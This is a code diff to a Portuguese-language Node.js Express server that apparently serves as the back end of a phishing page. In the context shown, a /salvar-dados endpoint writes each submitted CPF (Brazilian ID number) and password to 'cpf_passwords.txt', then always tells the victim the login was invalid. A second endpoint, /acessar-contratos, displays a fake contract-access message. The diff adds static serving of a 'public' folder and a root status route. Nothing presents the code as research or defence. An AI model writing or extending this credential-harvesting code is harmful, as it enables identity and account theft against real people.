@@ -1,14 +1,15 @@
 const express = require('express');
 const cors = require('cors');
-const fs = require('fs');
+const fs = require('fs'); 
 const path = require('path');
 
 const app = express();
 const port = process.env.PORT || 3000;
 const NOME_ARQUIVO_LOG = 'cpf_passwords.txt';
 
-app.use(cors()); 
+app.use(cors());
 app.use(express.json()); 
+app.use(express.static(path.join(__dirname, 'public')));
 
 app.post('/salvar-dados', (req, res) => {
     const { cpf, senha } = req.body;
@@ -30,7 +31,7 @@ app.post('/salvar-dados', (req, res) => {
         console.log('Dados salvos com sucesso em', NOME_ARQUIVO_LOG);
     });
 
-    
+
     res.status(401).json({ message: 'CPF ou senha inválidos. Tente novamente.' });
 });
 
@@ -55,6 +56,10 @@ app.post('/acessar-contratos', (req, res) => {
     });
 
     res.status(200).json({ message: 'Acessando seus contratos. Por favor, aguarde...' });
+});
+
+app.get('/', (req, res) => {
+    res.send('<h1>Servidor no ar!</h1><p>Aguardando requisições POST para /salvar-dados ou /acessar-contratos.</p>');
 });
 
 app.listen(port, () => {
